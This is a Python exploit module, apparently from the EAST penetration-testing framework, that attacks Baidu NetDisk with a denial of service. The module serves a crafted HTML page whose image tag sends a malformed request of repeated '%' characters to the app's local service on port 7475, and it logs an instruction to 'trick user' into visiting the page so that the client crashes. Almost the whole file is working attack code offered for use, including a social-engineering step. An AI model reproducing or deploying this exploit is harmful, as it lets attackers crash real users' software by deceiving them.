#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time

sys.path.append("./core")
from Sploit import Sploit
from WebHelper import SimpleWebServer

INFO = {}
INFO['NAME'] = "efa_baidu_netdisk_dos"
INFO['DESCRIPTION'] = "Baidu NetDisk - Denial Of Service"
INFO['VENDOR'] = "https://pan.baidu.com/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ''
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """Baidu NetDisk crashed if user visit special crafted web page
"""

INFO['CHANGELOG'] = "13 Sep, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Dos/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Your IP')
OPTIONS["PORT"] = 8080, dict(description = 'Your port for web server')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        self.host = self.args.get('HOST', self.host)
        
    def run(self):
        self.args()
        self.log("Serve on {}".format(self.host))
        
        html = '<html><img src=http://127.0.0.1:7475/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%/1.jpg></html>'
        
        server = SimpleWebServer(self.host, self.port)
        server.add_file_for_share("index.html", html)
        server.start_serve()
        
        self.log('Ok. Now trick user who runs baidu netdisk visit your address http://{}:{}/index.html'.format(self.host, self.port))
        self.log('Wait connection for 120s')
        time.sleep(120)
        
        server.stop_serve()
        self.log('Server stopped. If user visited your page his netdisk crashed')
        self.log('Done')
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
